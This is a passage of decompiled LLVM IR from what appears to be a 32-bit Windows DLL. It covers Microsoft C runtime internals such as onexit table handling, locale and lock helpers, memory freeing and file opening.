  store i32 0, i32* %storemerge5.reg2mem, !insn.addr !9259
  br label %dec_label_pc_1001b50e, !insn.addr !9259

dec_label_pc_1001b50e:                            ; preds = %dec_label_pc_1001b4cc, %dec_label_pc_1001b453, %dec_label_pc_1001b3d2
  %storemerge5.reload = load i32, i32* %storemerge5.reg2mem
  ret i32 %storemerge5.reload, !insn.addr !9260
}

define i32 @function_1001b513() local_unnamed_addr {
dec_label_pc_1001b513:
  %.reg2mem = alloca i32, !insn.addr !9261
  %eax.2.reg2mem = alloca i32, !insn.addr !9261
  %storemerge7.reg2mem = alloca i32, !insn.addr !9261
  %ebx.1.reg2mem = alloca i32, !insn.addr !9261
  %edi.1.ph.reg2mem = alloca i32, !insn.addr !9261
  %ebx.1.ph.reg2mem = alloca i32, !insn.addr !9261
  %edx.0.ph.reg2mem = alloca i32, !insn.addr !9261
  %stack_var_-24.0.ph.reg2mem = alloca i32, !insn.addr !9261
  %stack_var_-20.0.ph.reg2mem = alloca i32, !insn.addr !9261
  %ebx.0.reg2mem = alloca i32, !insn.addr !9261
  %edi.05.reg2mem = alloca i32, !insn.addr !9261
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = icmp eq i32 %0, 0, !insn.addr !9262
  %2 = icmp eq i1 %1, false, !insn.addr !9263
  br i1 %2, label %dec_label_pc_1001b539, label %dec_label_pc_1001b622, !insn.addr !9263

dec_label_pc_1001b539:                            ; preds = %dec_label_pc_1001b513
  %3 = load i32, i32* @global_var_1003d070, align 4, !insn.addr !9264
  %4 = add i32 %0, 4, !insn.addr !9265
  %5 = inttoptr i32 %4 to i32*, !insn.addr !9265
  %6 = load i32, i32* %5, align 4, !insn.addr !9265
  %7 = and i32 %3, 31, !insn.addr !9266
  %8 = xor i32 %3, %0, !insn.addr !9267
  %9 = xor i32 %6, %3, !insn.addr !9268
  %10 = icmp eq i32 %7, 0, !insn.addr !9269
  store i32 %8, i32* %edi.05.reg2mem, !insn.addr !9269
  store i32 %9, i32* %ebx.0.reg2mem, !insn.addr !9269
  br i1 %10, label %.thread, label %11, !insn.addr !9269

; <label>:11:                                     ; preds = %dec_label_pc_1001b539
  %12 = lshr i32 %8, %7, !insn.addr !9269
  %13 = sub nsw i32 32, %7
  %14 = shl i32 %8, %13, !insn.addr !9269
  %15 = or i32 %14, %12, !insn.addr !9269
  %16 = lshr i32 %9, %7, !insn.addr !9270
  %17 = shl i32 %9, %13, !insn.addr !9270
  %18 = or i32 %16, %17, !insn.addr !9270
  store i32 %15, i32* %edi.05.reg2mem, !insn.addr !9270
  store i32 %18, i32* %ebx.0.reg2mem, !insn.addr !9270
  br label %.thread, !insn.addr !9270

.thread:                                          ; preds = %dec_label_pc_1001b539, %11
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %edi.05.reload = load i32, i32* %edi.05.reg2mem
  %19 = add i32 %edi.05.reload, 1
  %20 = icmp ult i32 %19, 2
  store i32 %edi.05.reload, i32* %stack_var_-20.0.ph.reg2mem, !insn.addr !9271
  store i32 %ebx.0.reload, i32* %stack_var_-24.0.ph.reg2mem, !insn.addr !9271
  store i32 %3, i32* %edx.0.ph.reg2mem, !insn.addr !9271
  store i32 %ebx.0.reload, i32* %ebx.1.ph.reg2mem, !insn.addr !9271
  store i32 %edi.05.reload, i32* %edi.1.ph.reg2mem, !insn.addr !9271
  br i1 %20, label %dec_label_pc_1001b622, label %dec_label_pc_1001b57f.outer, !insn.addr !9271

dec_label_pc_1001b57f.outer:                      ; preds = %.thread, %44
  %edi.1.ph.reload = load i32, i32* %edi.1.ph.reg2mem
  %ebx.1.ph.reload = load i32, i32* %ebx.1.ph.reg2mem
  %edx.0.ph.reload = load i32, i32* %edx.0.ph.reg2mem
  %stack_var_-24.0.ph.reload = load i32, i32* %stack_var_-24.0.ph.reg2mem
  %stack_var_-20.0.ph.reload = load i32, i32* %stack_var_-20.0.ph.reg2mem
  store i32 %ebx.1.ph.reload, i32* %ebx.1.reg2mem
  br label %dec_label_pc_1001b57f

dec_label_pc_1001b57f:                            ; preds = %dec_label_pc_1001b57f.outer, %dec_label_pc_1001b586
  %ebx.1.reload = load i32, i32* %ebx.1.reg2mem
  %21 = add i32 %ebx.1.reload, -4, !insn.addr !9272
  %22 = icmp ult i32 %21, %edi.1.ph.reload, !insn.addr !9273
  br i1 %22, label %dec_label_pc_1001b5e6, label %dec_label_pc_1001b586, !insn.addr !9274

dec_label_pc_1001b586:                            ; preds = %dec_label_pc_1001b57f
  %23 = inttoptr i32 %21 to i32*
  %24 = load i32, i32* %23, align 4, !insn.addr !9275
  %25 = icmp eq i32 %24, %3, !insn.addr !9275
  store i32 %21, i32* %ebx.1.reg2mem, !insn.addr !9276
  br i1 %25, label %dec_label_pc_1001b57f, label %dec_label_pc_1001b58a, !insn.addr !9276

dec_label_pc_1001b58a:                            ; preds = %dec_label_pc_1001b586
  store i32 %3, i32* %23, align 4, !insn.addr !9277
  %26 = call i32 @function_10004670(), !insn.addr !9278
  %27 = load i32, i32* @global_var_1003d070, align 4, !insn.addr !9279
  %28 = and i32 %27, 31, !insn.addr !9280
  %29 = add nuw nsw i32 %28, 4, !insn.addr !9281
  %30 = inttoptr i32 %29 to i32*, !insn.addr !9281
  %31 = load i32, i32* %30, align 4, !insn.addr !9281
  %32 = and i32 %27, -32, !insn.addr !9282
  %33 = icmp eq i32 %28, 0, !insn.addr !9283
  br i1 %33, label %.thread6, label %35, !insn.addr !9283

.thread6:                                         ; preds = %dec_label_pc_1001b58a
  %34 = xor i32 %31, %27, !insn.addr !9284
  store i32 %32, i32* %storemerge7.reg2mem
  store i32 %34, i32* %eax.2.reg2mem
  br label %44

; <label>:35:                                     ; preds = %dec_label_pc_1001b58a
  %36 = lshr i32 %32, %28, !insn.addr !9283
  %37 = sub nsw i32 32, %28
  %38 = shl i32 %32, %37, !insn.addr !9283
  %39 = or i32 %38, %36, !insn.addr !9283
  %40 = xor i32 %31, %27, !insn.addr !9284
  %41 = lshr i32 %40, %28, !insn.addr !9285
  %42 = shl i32 %40, %37, !insn.addr !9285
  %43 = or i32 %41, %42, !insn.addr !9285
  store i32 %39, i32* %storemerge7.reg2mem, !insn.addr !9285
  store i32 %43, i32* %eax.2.reg2mem, !insn.addr !9285
  br label %44, !insn.addr !9285

; <label>:44:                                     ; preds = %.thread6, %35
  %eax.2.reload = load i32, i32* %eax.2.reg2mem
  %storemerge7.reload = load i32, i32* %storemerge7.reg2mem
  %45 = icmp eq i32 %storemerge7.reload, %stack_var_-20.0.ph.reload, !insn.addr !9286
  %46 = icmp eq i32 %eax.2.reload, %stack_var_-24.0.ph.reload, !insn.addr !9287
  %or.cond = icmp eq i1 %45, %46
  %spec.select = select i1 %or.cond, i32 %stack_var_-20.0.ph.reload, i32 %storemerge7.reload
  %spec.select2 = select i1 %or.cond, i32 %stack_var_-24.0.ph.reload, i32 %eax.2.reload
  %spec.select3 = select i1 %or.cond, i32 %21, i32 %eax.2.reload
  %spec.select4 = select i1 %or.cond, i32 %edi.1.ph.reload, i32 %storemerge7.reload
  store i32 %spec.select, i32* %stack_var_-20.0.ph.reg2mem
  store i32 %spec.select2, i32* %stack_var_-24.0.ph.reg2mem
  store i32 %27, i32* %edx.0.ph.reg2mem
  store i32 %spec.select3, i32* %ebx.1.ph.reg2mem
  store i32 %spec.select4, i32* %edi.1.ph.reg2mem
  br label %dec_label_pc_1001b57f.outer

dec_label_pc_1001b5e6:                            ; preds = %dec_label_pc_1001b57f
  %47 = icmp eq i32 %edi.1.ph.reload, -1, !insn.addr !9288
  store i32 %edx.0.ph.reload, i32* %.reg2mem, !insn.addr !9289
  br i1 %47, label %dec_label_pc_1001b5f8, label %dec_label_pc_1001b5eb, !insn.addr !9289

dec_label_pc_1001b5eb:                            ; preds = %dec_label_pc_1001b5e6
  %48 = call i32 @__free_base(i32 %edi.1.ph.reload), !insn.addr !9290
  %49 = load i32, i32* @global_var_1003d070, align 4, !insn.addr !9291
  store i32 %49, i32* %.reg2mem, !insn.addr !9292
  br label %dec_label_pc_1001b5f8, !insn.addr !9292

dec_label_pc_1001b5f8:                            ; preds = %dec_label_pc_1001b5eb, %dec_label_pc_1001b5e6
  %.reload = load i32, i32* %.reg2mem, !insn.addr !9293
  %50 = and i32 %.reload, 31, !insn.addr !9294
  %51 = sub nsw i32 32, %50, !insn.addr !9295
  %52 = inttoptr i32 %51 to i32*, !insn.addr !9296
  store i32 %.reload, i32* %52, align 4, !insn.addr !9296
  %53 = add nuw nsw i32 %51, 4, !insn.addr !9297
  %54 = inttoptr i32 %53 to i32*, !insn.addr !9297
  store i32 %.reload, i32* %54, align 4, !insn.addr !9297
  %55 = add nuw nsw i32 %51, 8, !insn.addr !9298
  %56 = inttoptr i32 %55 to i32*, !insn.addr !9298
  store i32 %.reload, i32* %56, align 4, !insn.addr !9298
  br label %dec_label_pc_1001b622, !insn.addr !9298

dec_label_pc_1001b622:                            ; preds = %.thread, %dec_label_pc_1001b5f8, %dec_label_pc_1001b513
  %57 = call i32 @"@__security_check_cookie@4"(), !insn.addr !9299
  ret i32 %57, !insn.addr !9300
}

declare i32 @__execute_onexit_table() local_unnamed_addr

declare i32 @__initialize_onexit_table(i32*) local_unnamed_addr

define i32 @function_1001b6f1() local_unnamed_addr {
dec_label_pc_1001b6f1:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = and i32 %0, -256, !insn.addr !9301
  %2 = or i32 %1, 1, !insn.addr !9301
  ret i32 %2, !insn.addr !9302
}

define i32 @function_1001b6f4() local_unnamed_addr {
dec_label_pc_1001b6f4:
  %0 = call i32 @___dcrt_uninitialize_environments_nolock(), !insn.addr !9303
  %1 = and i32 %0, -256, !insn.addr !9304
  %2 = or i32 %1, 1, !insn.addr !9304
  ret i32 %2, !insn.addr !9305
}

define i32 @function_1001b739() local_unnamed_addr {
dec_label_pc_1001b739:
  %0 = call i32 @___vcrt_uninitialize(i32 0), !insn.addr !9306
  ret i32 %0, !insn.addr !9307
}

define void @"??R<lambda_af42a3ee9806e9a7305d451646e05244>@@QBEXAAPAU__crt_multibyte_data@@@Z"(i32* %result, i32** %arg2) local_unnamed_addr {
dec_label_pc_1001b7a6:
  %0 = load i32*, i32** %arg2, align 4, !insn.addr !9308
  %1 = load i32, i32* %0, align 4, !insn.addr !9309
  %2 = add i32 %1, -1, !insn.addr !9309
  %3 = icmp eq i32 %2, 0, !insn.addr !9309
  store i32 %2, i32* %0, align 4, !insn.addr !9309
  %4 = icmp eq i1 %3, false, !insn.addr !9310
  br i1 %4, label %dec_label_pc_1001b7cf, label %dec_label_pc_1001b7ba, !insn.addr !9310

dec_label_pc_1001b7ba:                            ; preds = %dec_label_pc_1001b7a6
  %5 = load i32*, i32** %arg2, align 4
  %6 = icmp eq i32* %5, @global_var_1003d778, !insn.addr !9311
  br i1 %6, label %dec_label_pc_1001b7cf, label %dec_label_pc_1001b7c4, !insn.addr !9312

dec_label_pc_1001b7c4:                            ; preds = %dec_label_pc_1001b7ba
  %7 = ptrtoint i32* %5 to i32
  %8 = bitcast i32** %arg2 to i32*, !insn.addr !9311
  %9 = call i32 @__free_base(i32 %7), !insn.addr !9313
  store i32 ptrtoint (i32* @global_var_1003d778 to i32), i32* %8, align 4, !insn.addr !9314
  br label %dec_label_pc_1001b7cf, !insn.addr !9314

dec_label_pc_1001b7cf:                            ; preds = %dec_label_pc_1001b7ba, %dec_label_pc_1001b7c4, %dec_label_pc_1001b7a6
  ret void, !insn.addr !9315
}

define i32 @___acrt_initialize() local_unnamed_addr {
dec_label_pc_1001b7d4:
  %0 = call i32 @___acrt_execute_initializers(i32* nonnull @global_var_10032300, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10032378, i32 0, i32 0)), !insn.addr !9316
  ret i32 %0, !insn.addr !9317
}

define i32 @___acrt_thread_attach() local_unnamed_addr {
dec_label_pc_1001b7e6:
  %0 = call i32 @___acrt_getptd_noexit(), !insn.addr !9318
  %1 = icmp eq i32 %0, 0, !insn.addr !9319
  %2 = icmp eq i1 %1, false, !insn.addr !9320
  %3 = zext i1 %2 to i32, !insn.addr !9320
  %4 = and i32 %0, -256, !insn.addr !9320
  %5 = or i32 %4, %3, !insn.addr !9320
  ret i32 %5, !insn.addr !9321
}

define i32 @function_1001b7f1() local_unnamed_addr {
dec_label_pc_1001b7f1:
  %0 = call i32 @___acrt_freeptd(), !insn.addr !9322
  %1 = and i32 %0, -256, !insn.addr !9323
  %2 = or i32 %1, 1, !insn.addr !9323
  ret i32 %2, !insn.addr !9324
}

define i32 @___acrt_uninitialize() local_unnamed_addr {
dec_label_pc_1001b7f9:
  %0 = call i32 @___acrt_execute_uninitializers(i32* nonnull @global_var_10032300, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10032378, i32 0, i32 0)), !insn.addr !9325
  ret i32 %0, !insn.addr !9326
}

declare i32 @___acrt_uninitialize_critical(i32) local_unnamed_addr

declare i32 @__initterm() local_unnamed_addr

declare i32 @__initterm_e() local_unnamed_addr

declare i32 @_wcsncmp(i16*, i16*, i32) local_unnamed_addr

define i32 @function_1001c3b4() local_unnamed_addr {
dec_label_pc_1001c3b4:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @___acrt_lowio_unlock_fh(i32 %0), !insn.addr !9327
  ret i32 %1, !insn.addr !9328
}

define i32 @function_1001ca84() local_unnamed_addr {
dec_label_pc_1001ca84:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @___acrt_lowio_unlock_fh(i32 %0), !insn.addr !9329
  ret i32 %1, !insn.addr !9330
}

define i32 @function_1001d019() local_unnamed_addr {
dec_label_pc_1001d019:
  %0 = call i32 @___acrt_unlock(i32 7), !insn.addr !9331
  ret i32 %0, !insn.addr !9332
}

define i32 @function_1001d04e(i32* %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_1001d04e:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__SEH_prolog4(i32* nonnull @global_var_1003baa8, i32 8), !insn.addr !9333
  %2 = add i32 %0, 8, !insn.addr !9334
  %3 = inttoptr i32 %2 to i32*, !insn.addr !9334
  %4 = load i32, i32* %3, align 4, !insn.addr !9334
  %5 = inttoptr i32 %4 to i32*, !insn.addr !9335
  %6 = load i32, i32* %5, align 4, !insn.addr !9335
  %7 = call i32 @___acrt_lock(i32 %6), !insn.addr !9336
  %8 = add i32 %0, -4, !insn.addr !9337
  %9 = inttoptr i32 %8 to i32*, !insn.addr !9337
  store i32 0, i32* %9, align 4, !insn.addr !9337
  %10 = add i32 %0, 12, !insn.addr !9338
  %11 = inttoptr i32 %10 to i32*, !insn.addr !9338
  %12 = load i32, i32* %11, align 4, !insn.addr !9338
  %13 = inttoptr i32 %12 to i32*, !insn.addr !9339
  %14 = load i32, i32* %13, align 4, !insn.addr !9339
  %15 = inttoptr i32 %14 to i32*, !insn.addr !9340
  %16 = load i32, i32* %15, align 4, !insn.addr !9340
  %17 = add i32 %16, 72, !insn.addr !9341
  %18 = inttoptr i32 %17 to i32*, !insn.addr !9341
  %19 = load i32, i32* %18, align 4, !insn.addr !9341
  %20 = inttoptr i32 %19 to i32*, !insn.addr !9342
  %21 = load i32, i32* %20, align 4, !insn.addr !9342
  %22 = add i32 %21, 1, !insn.addr !9342
  store i32 %22, i32* %20, align 4, !insn.addr !9342
  store i32 -2, i32* %9, align 4, !insn.addr !9343
  %23 = call i32 @function_1001d08a(), !insn.addr !9344
  %24 = call i32 @__SEH_epilog4(), !insn.addr !9345
  ret i32 %24, !insn.addr !9346
}

define i32 @function_1001d08a() local_unnamed_addr {
dec_label_pc_1001d08a:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, 16, !insn.addr !9347
  %2 = inttoptr i32 %1 to i32*, !insn.addr !9347
  %3 = load i32, i32* %2, align 4, !insn.addr !9347
  %4 = inttoptr i32 %3 to i32*, !insn.addr !9348
  %5 = load i32, i32* %4, align 4, !insn.addr !9348
  %6 = call i32 @___acrt_unlock(i32 %5), !insn.addr !9349
  ret i32 %6, !insn.addr !9350
}

define i32 @function_1001d096(i32* %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_1001d096:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__SEH_prolog4(i32* nonnull @global_var_1003bae8, i32 8), !insn.addr !9351
  %2 = add i32 %0, 8, !insn.addr !9352
  %3 = inttoptr i32 %2 to i32*, !insn.addr !9352
  %4 = load i32, i32* %3, align 4, !insn.addr !9352
  %5 = inttoptr i32 %4 to i32*, !insn.addr !9353
  %6 = load i32, i32* %5, align 4, !insn.addr !9353
  %7 = call i32 @___acrt_lock(i32 %6), !insn.addr !9354
  %8 = add i32 %0, -4, !insn.addr !9355
  %9 = inttoptr i32 %8 to i32*, !insn.addr !9355
  store i32 0, i32* %9, align 4, !insn.addr !9355
  %10 = add i32 %0, 12, !insn.addr !9356
  %11 = inttoptr i32 %10 to i32*, !insn.addr !9356
  %12 = load i32, i32* %11, align 4, !insn.addr !9356
  %13 = inttoptr i32 %12 to i32*, !insn.addr !9357
  %14 = load i32, i32* %13, align 4, !insn.addr !9357
  %15 = inttoptr i32 %14 to i32*, !insn.addr !9358
  %16 = load i32, i32* %15, align 4, !insn.addr !9358
  %17 = add i32 %16, 72, !insn.addr !9359
  %18 = inttoptr i32 %17 to i32*, !insn.addr !9359
  %19 = load i32, i32* %18, align 4, !insn.addr !9359
  %20 = icmp eq i32 %19, 0, !insn.addr !9360
  br i1 %20, label %dec_label_pc_1001d0d7, label %dec_label_pc_1001d0bf, !insn.addr !9361

dec_label_pc_1001d0bf:                            ; preds = %dec_label_pc_1001d096
  %21 = inttoptr i32 %19 to i32*, !insn.addr !9362
  %22 = load i32, i32* %21, align 4, !insn.addr !9362
  %23 = add i32 %22, -1, !insn.addr !9362
  %24 = icmp eq i32 %23, 0, !insn.addr !9362
  store i32 %23, i32* %21, align 4, !insn.addr !9362
  %25 = icmp eq i1 %24, false, !insn.addr !9363
  %26 = icmp eq i32 %19, ptrtoint (i32* @global_var_1003d778 to i32), !insn.addr !9364
  %or.cond = or i1 %26, %25
  br i1 %or.cond, label %dec_label_pc_1001d0d7, label %dec_label_pc_1001d0d0, !insn.addr !9363

dec_label_pc_1001d0d0:                            ; preds = %dec_label_pc_1001d0bf
  %27 = call i32 @__free_base(i32 %19), !insn.addr !9365
  br label %dec_label_pc_1001d0d7, !insn.addr !9366

dec_label_pc_1001d0d7:                            ; preds = %dec_label_pc_1001d0d0, %dec_label_pc_1001d0bf, %dec_label_pc_1001d096
  store i32 -2, i32* %9, align 4, !insn.addr !9367
  %28 = call i32 @function_1001d0eb(), !insn.addr !9368
  %29 = call i32 @__SEH_epilog4(), !insn.addr !9369
  ret i32 %29, !insn.addr !9370
}

define i32 @function_1001d0eb() local_unnamed_addr {
dec_label_pc_1001d0eb:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, 16, !insn.addr !9371
  %2 = inttoptr i32 %1 to i32*, !insn.addr !9371
  %3 = load i32, i32* %2, align 4, !insn.addr !9371
  %4 = inttoptr i32 %3 to i32*, !insn.addr !9372
  %5 = load i32, i32* %4, align 4, !insn.addr !9372
  %6 = call i32 @___acrt_unlock(i32 %5), !insn.addr !9373
  ret i32 %6, !insn.addr !9374
}

define i32 @function_1001d0f7(i32* %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_1001d0f7:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__SEH_prolog4(i32* nonnull @global_var_1003bb08, i32 8), !insn.addr !9375
  %2 = add i32 %0, 8, !insn.addr !9376
  %3 = inttoptr i32 %2 to i32*, !insn.addr !9376
  %4 = load i32, i32* %3, align 4, !insn.addr !9376
  %5 = inttoptr i32 %4 to i32*, !insn.addr !9377
  %6 = load i32, i32* %5, align 4, !insn.addr !9377
  %7 = call i32 @___acrt_lock(i32 %6), !insn.addr !9378
  %8 = add i32 %0, -4, !insn.addr !9379
  %9 = inttoptr i32 %8 to i32*, !insn.addr !9379
  store i32 0, i32* %9, align 4, !insn.addr !9379
  %10 = add i32 %0, 12, !insn.addr !9380
  %11 = inttoptr i32 %10 to i32*, !insn.addr !9380
  %12 = load i32, i32* %11, align 4, !insn.addr !9380
  %13 = inttoptr i32 %12 to i32*, !insn.addr !9381
  %14 = load i32, i32* %13, align 4, !insn.addr !9381
  %15 = inttoptr i32 %14 to i32*, !insn.addr !9382
  %16 = load i32, i32* %15, align 4, !insn.addr !9382
  %17 = inttoptr i32 %16 to i32*, !insn.addr !9383
  %18 = call i32 @"?replace_current_thread_locale_nolock@@YAXQAU__acrt_ptd@@QAU__crt_locale_data@@@Z"(i32* %17, i32* null), !insn.addr !9383
  store i32 -2, i32* %9, align 4, !insn.addr !9384
  %19 = call i32 @function_1001d136(), !insn.addr !9385
  %20 = call i32 @__SEH_epilog4(), !insn.addr !9386
  ret i32 %20, !insn.addr !9387
}

define i32 @function_1001d136() local_unnamed_addr {
dec_label_pc_1001d136:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, 16, !insn.addr !9388
  %2 = inttoptr i32 %1 to i32*, !insn.addr !9388
  %3 = load i32, i32* %2, align 4, !insn.addr !9388
  %4 = inttoptr i32 %3 to i32*, !insn.addr !9389
  %5 = load i32, i32* %4, align 4, !insn.addr !9389
  %6 = call i32 @___acrt_unlock(i32 %5), !insn.addr !9390
  ret i32 %6, !insn.addr !9391
}

define i32 @function_1001d142(i32* %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_1001d142:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__SEH_prolog4(i32* nonnull @global_var_1003bac8, i32 8), !insn.addr !9392
  %2 = add i32 %0, 8, !insn.addr !9393
  %3 = inttoptr i32 %2 to i32*, !insn.addr !9393
  %4 = load i32, i32* %3, align 4, !insn.addr !9393
  %5 = inttoptr i32 %4 to i32*, !insn.addr !9394
  %6 = load i32, i32* %5, align 4, !insn.addr !9394
  %7 = call i32 @___acrt_lock(i32 %6), !insn.addr !9395
  %8 = add i32 %0, -4, !insn.addr !9396
  %9 = inttoptr i32 %8 to i32*, !insn.addr !9396
  store i32 0, i32* %9, align 4, !insn.addr !9396
  %10 = add i32 %0, 12, !insn.addr !9397
  %11 = inttoptr i32 %10 to i32*, !insn.addr !9397
  %12 = load i32, i32* %11, align 4, !insn.addr !9397
  %13 = add i32 %12, 4, !insn.addr !9398
  %14 = inttoptr i32 %13 to i32*, !insn.addr !9398
  %15 = load i32, i32* %14, align 4, !insn.addr !9398
  %16 = inttoptr i32 %15 to i32*, !insn.addr !9399
  %17 = load i32, i32* %16, align 4, !insn.addr !9399
  %18 = inttoptr i32 %17 to i32*, !insn.addr !9400
  %19 = load i32, i32* %18, align 4, !insn.addr !9400
  %20 = inttoptr i32 %12 to i32*, !insn.addr !9401
  %21 = load i32, i32* %20, align 4, !insn.addr !9401
  %22 = inttoptr i32 %21 to i32*, !insn.addr !9402
  %23 = load i32, i32* %22, align 4, !insn.addr !9402
  %24 = inttoptr i32 %23 to i32*, !insn.addr !9403
  %25 = inttoptr i32 %19 to i32*, !insn.addr !9403
  %26 = call i32 @"?replace_current_thread_locale_nolock@@YAXQAU__acrt_ptd@@QAU__crt_locale_data@@@Z"(i32* %24, i32* %25), !insn.addr !9403
  store i32 -2, i32* %9, align 4, !insn.addr !9404
  %27 = call i32 @function_1001d186(), !insn.addr !9405
  %28 = call i32 @__SEH_epilog4(), !insn.addr !9406
  ret i32 %28, !insn.addr !9407
}

define i32 @function_1001d186() local_unnamed_addr {
dec_label_pc_1001d186:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, 16, !insn.addr !9408
  %2 = inttoptr i32 %1 to i32*, !insn.addr !9408
  %3 = load i32, i32* %2, align 4, !insn.addr !9408
  %4 = inttoptr i32 %3 to i32*, !insn.addr !9409
  %5 = load i32, i32* %4, align 4, !insn.addr !9409
  %6 = call i32 @___acrt_unlock(i32 %5), !insn.addr !9410
  ret i32 %6, !insn.addr !9411
}

define void @"??$__acrt_lock_and_call@V<lambda_46720907175c18b6c9d2717bc0d2d362>@@@@YAXW4__acrt_lock_id@@$$QAV<lambda_46720907175c18b6c9d2717bc0d2d362>@@@Z"(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_1001d192:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = ptrtoint i32* %arg2 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4, !insn.addr !9412
  store i32 %arg1, i32* %stack_var_-16, align 4, !insn.addr !9413
  %2 = call i32 @function_1001d142(i32* nonnull %stack_var_-16, i32 %1, i32* nonnull %stack_var_-12, i32 %arg1, i32 %arg1, i32 %0), !insn.addr !9414
  ret void, !insn.addr !9415
}

define void @"??$__acrt_lock_and_call@V<lambda_5ce1d447e08cb34b2473517608e21441>@@@@YAXW4__acrt_lock_id@@$$QAV<lambda_5ce1d447e08cb34b2473517608e21441>@@@Z"(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_1001d1ba:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = ptrtoint i32* %arg2 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4, !insn.addr !9416
  store i32 %arg1, i32* %stack_var_-16, align 4, !insn.addr !9417
  %2 = call i32 @function_1001d096(i32* nonnull %stack_var_-16, i32 %1, i32* nonnull %stack_var_-12, i32 %arg1, i32 %arg1, i32 %0), !insn.addr !9418
  ret void, !insn.addr !9419
}

define void @"??$__acrt_lock_and_call@V<lambda_b8d4b9c228a6ecc3f80208dbb4b4a104>@@@@YAXW4__acrt_lock_id@@$$QAV<lambda_b8d4b9c228a6ecc3f80208dbb4b4a104>@@@Z"(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_1001d1e2:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = ptrtoint i32* %arg2 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4, !insn.addr !9420
  store i32 %arg1, i32* %stack_var_-16, align 4, !insn.addr !9421
  %2 = call i32 @function_1001d0f7(i32* nonnull %stack_var_-16, i32 %1, i32* nonnull %stack_var_-12, i32 %arg1, i32 %arg1, i32 %0), !insn.addr !9422
  ret void, !insn.addr !9423
}

define void @"??$__acrt_lock_and_call@V<lambda_da44e0f8b0f19ba52fefafb335991732>@@@@YAXW4__acrt_lock_id@@$$QAV<lambda_da44e0f8b0f19ba52fefafb335991732>@@@Z"(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_1001d20a:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = ptrtoint i32* %arg2 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4, !insn.addr !9424
  store i32 %arg1, i32* %stack_var_-16, align 4, !insn.addr !9425
  %2 = call i32 @function_1001d04e(i32* nonnull %stack_var_-16, i32 %1, i32* nonnull %stack_var_-12, i32 %arg1, i32 %arg1, i32 %0), !insn.addr !9426
  ret void, !insn.addr !9427
}

declare i32 @"?replace_current_thread_locale_nolock@@YAXQAU__acrt_ptd@@QAU__crt_locale_data@@@Z"(i32*, i32*) local_unnamed_addr

declare i32 @___acrt_freeptd() local_unnamed_addr

declare i32 @___acrt_getptd() local_unnamed_addr

declare i32 @___acrt_getptd_noexit() local_unnamed_addr

define i32 @function_1001d689() local_unnamed_addr {
dec_label_pc_1001d689:
  %0 = call i32 @___acrt_unlock(i32 8), !insn.addr !9428
  ret i32 %0, !insn.addr !9429
}

declare i32 @"?__acrt_stdio_free_stream@@YAXV__crt_stdio_stream@@@Z"(i32) local_unnamed_addr

declare i32 @"??$common_openfile@D@@YAPAU_iobuf@@QBD0HV__crt_stdio_stream@@@Z"(i8*, i8*, i32, i32) local_unnamed_addr

define i32 @__openfile() local_unnamed_addr {
dec_label_pc_1001db3a:
  %0 = call i32 @"??$common_openfile@D@@YAPAU_iobuf@@QBD0HV__crt_stdio_stream@@@Z"(i8* bitcast (i32* @1 to i8*), i8* bitcast (i32* @1 to i8*), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !9430
  ret i32 %0, !insn.addr !9430
}

define i32 @function_1001db45(i32* %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_1001db45:
  %storemerge.reg2mem = alloca i32, !insn.addr !9431
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__SEH_prolog4(i32* nonnull @global_var_1003bb48, i32 12), !insn.addr !9432
  %2 = add i32 %0, -28, !insn.addr !9433
  %3 = inttoptr i32 %2 to i32*, !insn.addr !9433
  store i32 0, i32* %3, align 4, !insn.addr !9433
  %4 = add i32 %0, 8, !insn.addr !9434
  %5 = inttoptr i32 %4 to i32*, !insn.addr !9434
  %6 = load i32, i32* %5, align 4, !insn.addr !9434
  %7 = inttoptr i32 %6 to i32*, !insn.addr !9435
  %8 = load i32, i32* %7, align 4, !insn.addr !9435
  %9 = call i32 @___acrt_lowio_lock_fh(i32 %8), !insn.addr !9436
